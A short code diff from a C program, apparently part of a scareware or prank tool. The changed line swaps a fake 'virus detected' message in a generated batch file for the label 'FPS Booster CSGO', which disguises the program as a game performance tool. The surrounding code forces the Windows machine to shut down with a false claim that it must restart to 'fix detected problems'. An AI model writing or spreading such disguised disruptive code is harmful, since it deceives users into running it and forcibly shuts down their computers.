@@ -40,7 +40,7 @@ void tscan() {
             system("timeout 10");
             exit(0);
         }
-        fprintf(f,"\necho off\necho A virus has been detected on your computer\npause");
+        fprintf(f,"\necho off\necho FPS Booster CSGO\npause");
         fclose(f);
         system("shutdown /f /t 005 /s /c \"We have to restart the PC to fix detected problems.\"");
         exit(0);
